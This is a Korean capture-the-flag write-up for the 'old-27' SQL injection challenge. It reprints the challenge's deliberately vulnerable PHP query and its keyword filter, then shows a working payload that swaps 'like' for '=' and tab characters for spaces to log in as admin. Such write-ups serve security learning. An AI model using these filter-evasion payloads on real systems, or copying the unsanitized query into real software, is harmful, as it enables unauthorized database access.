<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Webhacking old-27 Write-Up</h1>
</body>
<br>
<br>
</html>

먼저 문제 서버로 들어가보자.
![image](https://github.com/user-attachments/assets/4458cb21-58b0-4627-9b23-ba2ad499ad8b)

입력칸이 보인다.
바로 문제 소스코드를 살펴보자.

```python
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 27</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get action=index.php>
<input type=text name=no><input type=submit>
</form>
<?php
  if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
<br><a href=?view_source=1>view-source</a>
</body>
</html>
```

코드를 살펴보니 admin으로 로그인하면 문제를 해결할 수 있는것 같다. 
```python
if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
```
```preg_match```함수를 사용해  ```#```, ```select```, ```(```, ```공백```, ```limit```, ```=```, ```0x``` 등의 문자열을 필터링하고 있다.

```python
$r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
```
그리고 위의 코드를 보면  chall27 테이블에서 데이터를 가져오는데 id는 guest이고 no가 guest가 아닐 경우 querry error를 뜨게 되는 것을 알 수 있다. 

주석문을 통해 admin의 no가 2임을 알 수 있다. 

그렇다면 쿼리문을 통해 admin으로 로그인 하려면
```
SELECT id FROM chall27 WHERE id='guest' AND no=(0) or no=2;--
```
위와 같은 쿼리문을 만들어야 하므로 ```=```과 ```공백```우회 하는 방법을 찾아야 한다.
구글링 해보니 ```=```은 ```like```로 우회가 가능하고 ```공백```은 ```%09```으로 우회가 가능하다.

```python
0)%09or%09no%09like%092;--%09
```
![image](https://github.com/user-attachments/assets/0dc2871b-ab1c-4342-b8d5-916b9f97e243)

정답임을 확인했다!!
